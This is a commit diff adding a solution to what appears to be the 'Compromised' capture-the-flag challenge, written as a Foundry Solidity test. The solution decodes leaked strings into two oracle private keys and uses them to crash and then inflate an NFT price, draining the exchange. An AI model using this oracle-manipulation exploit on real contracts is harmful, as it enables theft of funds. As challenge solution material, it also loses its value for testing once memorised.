5b465a2bf30e2f51cbaae4531ff5707415c56c3d
nocturnuscoder <nocturnuscoder@pm.me>
2025-05-03 18:13:20 +0300

    Updated Compromised.t.sol

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -69,7 +69,55 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {}
+    function test_compromised() public checkSolved {
+        /* 
+        4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
+        hex to ascii:
+        MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
+        base64 decode to utf-8
+        0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        cast wallet address 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088 <- source 1
+
+        4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535
+        hex to ascii:
+        MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
+        base64 decode to utf-8
+        0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        cast wallet address 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8 <- source 2
+        */     
+        uint256 source1PK = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 source2PK = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1Address = vm.addr(source1PK);
+        address source2Address = vm.addr(source2PK);
+        uint256 nftPriceNew = 0.05 ether;
+
+        vm.prank(source1Address);
+        oracle.postPrice("DVNFT", nftPriceNew);
+        vm.prank(source2Address);
+        oracle.postPrice("DVNFT", nftPriceNew);
+
+        vm.prank(player);
+        exchange.buyOne{value: nftPriceNew}();
+
+        vm.prank(source1Address);
+        oracle.postPrice("DVNFT", (INITIAL_NFT_PRICE + nftPriceNew));
+        vm.prank(source2Address);
+        oracle.postPrice("DVNFT", (INITIAL_NFT_PRICE + nftPriceNew));
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        (bool success, ) = address(recovery).call{value:INITIAL_NFT_PRICE}("");
+        require(success, "Transfer to recovery address failed");
+        vm.stopPrank();
+
+        vm.prank(source1Address);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(source2Address);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
